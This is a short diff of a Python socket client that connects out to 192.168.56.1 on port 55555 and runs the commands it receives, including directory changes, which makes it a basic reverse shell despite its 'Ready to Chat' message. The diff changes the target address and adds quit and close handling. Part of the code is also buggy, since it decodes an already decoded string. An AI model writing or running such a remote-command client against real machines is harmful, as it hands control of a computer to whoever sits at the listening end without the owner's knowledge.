@@ -6,7 +6,7 @@ import subprocess
 import os
 try:
 	soc=socket.socket()
-	soc.connect(('127.0.0.1',9100))
+	soc.connect(('192.168.56.1',55555))
 	print('Ready to Chat !')
 	cmd=''
 	while True:
@@ -14,6 +14,7 @@ try:
 		data=soc.recv(1024).decode()
 		if data.lower()=='quit':
 			soc.close()
+			break
 		if data[:2]=='cd':
 			#if we have detected a cd command 
 			os.chdir(data[3:].decode())
@@ -28,3 +29,4 @@ try:
 			print(output_string)
 except socket.error as s_r:
 	print('The socket ha met with some error :',str(s_r))
+	print('Client Socket is Closing...')
